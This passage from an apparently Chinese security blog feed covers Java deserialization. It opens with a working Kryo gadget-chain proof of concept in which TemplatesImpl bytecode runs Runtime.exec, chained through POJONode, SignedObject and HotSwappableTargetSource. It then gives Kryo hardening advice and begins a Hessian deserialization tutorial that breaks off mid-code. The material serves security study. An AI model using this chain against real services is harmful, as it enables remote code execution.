class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="comment">// 二次反序列化</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilGeneratedByJavassist&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public EvilGeneratedByJavassist()&#123;Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[] byteCode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 SignedObject</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置二次反序列化入口</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(pojoNode1, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次反序列化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pojoNode2);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;s&quot;</span>));</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, h1, h1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, h2, h2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(s,hashMap);</span><br><span class="line">        s.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链是<br><code>HotSwappableTargetSource.equals-&gt;XString.equals-&gt;POJONode.toString-&gt;SignedObject.getObject-&gt;POJONode.toString-&gt;getOutputProperties</code><br>可能有人会好奇为什么要绕一大圈调用两个POJONode.toString才能执行，直接调用最后那个不就行了吗，但是kryo默认是不反序列化transient字段的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" alt><br>所以_tfactory是不会被反序列化的，这样导致POJONode调用getter方法的时候会报错，导致执行不了getOutputProperties</p><h2 id="Kryo反序列化Javabean"><a href="#Kryo反序列化Javabean" class="headerlink" title="Kryo反序列化Javabean"></a>Kryo反序列化Javabean</h2><p>上面的反序列化都是默认去调用FieldSerializer<br>但是还有很多其他类型的Serializer，都继承Serializer<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" alt><br>这里面第一个就引起了我的注意，很多反序列化链都是通过调用一些JavaBean去触发一些操作的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" alt><br>看到简介，如何使用该Serializer<br>这里我直接给出简单的demo<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.register(MyClass.class,<span class="keyword">new</span> <span class="title class_">BeanSerializer</span>(kryo, MyClass.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        s.setNum(<span class="number">10</span>);</span><br><span class="line">        s.setHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="read-and-write"><a href="#read-and-write" class="headerlink" title="read and write"></a>read and write</h3><p>先来看看源码<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" alt><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" alt><br>可以发现两个函数都有个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">property.get</span><br><span class="line">property.set</span><br></pre></td></tr></table></figure><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" alt><br>这些就会触发该类的Bean方法<br>那么其他操作就应该类似于Fastjson里面的那些类了，这里就不在过多叙述了</p><h2 id="kryo的防护"><a href="#kryo的防护" class="headerlink" title="kryo的防护"></a>kryo的防护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.setRegistrationRequired(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>当使用如上代码，那么所有反序列化的类都必须要被注册，才会被反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.addDefaultSerializer(Class,Serializer)</span><br></pre></td></tr></table></figure><p>当使用上面的代码，可以增加自己的Serializer，自己实现serializer的时候增加相应的黑名单即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></li><li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md</a></li><li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入门kryo&quot;&gt;&lt;a href=&quot;#入门kryo&quot; class=&quot;headerlink&quot; title=&quot;入门kryo&quot;&gt;&lt;/a&gt;入门kryo&lt;/h2&gt;&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;首先看个简单的demo&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="kryo" scheme="http://example.com/tags/kryo/"/>
    
  </entry>
  
  <entry>
    <title>hessian反序列化</title>
    <link href="http://example.com/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-09-07T15:17:04.000Z</published>
    <updated>2023-09-13T05:28:41.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入门Hessian反序列化"><a href="#入门Hessian反序列化" class="headerlink" title="入门Hessian反序列化"></a>入门Hessian反序列化</h2><span id="more"></span><h3 id="People"><a href="#People" class="headerlink" title="People"></a>People</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getId call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setId call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Student"><a href="#Student" class="headerlink" title="Student"></a>Student</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">111</span>, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;ggg&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String gender;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Class&lt;Object&gt;&gt; innerMap;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; friends;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getInnerMap</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getInnerMap call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInnerMap</span><span class="params">(Map innerMap)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setInnerMap call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.innerMap = innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getGender call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setGender call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student default constructor call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, String name, String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student custom constructor call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ObjectInputStream)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readObject call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readResolve call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student hashCode call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student finalize call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, innerMap=&quot;</span> + innerMap +</span><br><span class="line">                <span class="string">&quot;, friends=&quot;</span> + friends +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Serialize-and-DeSerialize"><a href="#Serialize-and-DeSerialize" class="headerlink" title="Serialize and DeSerialize"></a>Serialize and DeSerialize</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLData;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HJSerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(os);</span><br><span class="line">            output.writeObject(t);</span><br><span class="line">            data = os.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(is);</span><br><span class="line">            result = input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (T) result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">111</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hessian&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span 